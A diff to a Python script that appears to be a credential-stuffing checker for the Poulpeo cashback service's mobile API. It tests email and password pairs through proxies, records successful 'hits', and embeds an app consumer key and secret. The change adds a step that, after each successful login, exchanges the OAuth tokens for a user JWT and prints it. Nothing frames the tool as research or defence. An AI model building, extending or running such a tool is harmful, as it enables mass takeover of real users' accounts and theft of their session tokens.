@@ -19,7 +19,7 @@ from urllib.parse import parse_qs
 # CONFIG
 # =========================================================
 
-CONSUMER_KEY = "als57b6d9bfbd8041.16892809"
+CONSUMER_KEY = "als57b6d9b235e084.77233595"
 CONSUMER_SECRET = "84dbb79eddc1effe14965db52caeae70636ac31b"
 
 INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
@@ -286,6 +286,18 @@ ACCESS_TOKEN_HEADERS = {
     "user-agent": ACCESS_TOKEN_UA,
 }
 
+GET_TOKEN_URL = "https://mobile.poulpeo.com/api/2.2/user/getToken/"
+
+GET_TOKEN_HEADERS = {
+    "accept": "application/json",
+    "x-client-version": "26.1.5",
+    "accept-charset": "UTF-8",
+    "accept-encoding": "deflate;q=1.0,gzip;q=0.9",
+    "accept-language": "fr-FR,fr;q=0.9",
+    "user-agent": ACCESS_TOKEN_UA,
+    "priority": "u=3, i",
+}
+
 _STATUS_OK_RE = re.compile(r'"status"\s*:\s*"ok"')
 
 
@@ -403,6 +415,32 @@ def post_access_token(session, oauth_token, oauth_token_secret):
     )
 
 
+def parse_oauth_token_response(text):
+    if not text or not str(text).strip():
+        return None, None
+    parsed = parse_qs(str(text).strip())
+    ot = (parsed.get("oauth_token") or [None])[0]
+    os_ = (parsed.get("oauth_token_secret") or [None])[0]
+    if ot and os_:
+        return ot, os_
+    return None, None
+
+
+def get_user_token_jwt(session, oauth_token, oauth_token_secret):
+    auth_header = build_oauth_header(
+        method="GET",
+        url=GET_TOKEN_URL,
+        consumer_key=CONSUMER_KEY,
+        consumer_secret=CONSUMER_SECRET,
+        token=oauth_token,
+        token_secret=oauth_token_secret,
+        extra_params=None,
+    )
+    headers = GET_TOKEN_HEADERS.copy()
+    headers["authorization"] = auth_header
+    return session.get(GET_TOKEN_URL, headers=headers)
+
+
 def classify_login_response(response):
     text = response.text or ""
 
@@ -469,6 +507,23 @@ def process_account(email, password, proxy_url, stats, hit_writer):
                 ACCESS_TOKEN_URL,
                 acc_response,
             )
+            acc_tok, acc_sec = parse_oauth_token_response(acc_response.text or "")
+            if acc_tok and acc_sec:
+                gt_response = get_user_token_jwt(session, acc_tok, acc_sec)
+                print_reponse_finale_complete(
+                    email,
+                    "user/getToken — JWT (réponse finale)",
+                    GET_TOKEN_URL,
+                    gt_response,
+                )
+            else:
+                with _RESPONSE_PRINT_LOCK:
+                    builtins.print(
+                        "\n"
+                        "[getToken ignoré] Corps accessToken sans "
+                        "oauth_token / oauth_token_secret parseables.\n",
+                        flush=True,
+                    )
             hit_writer.append_hit(email, password)
         stats.record(kind)
     except Exception as e:
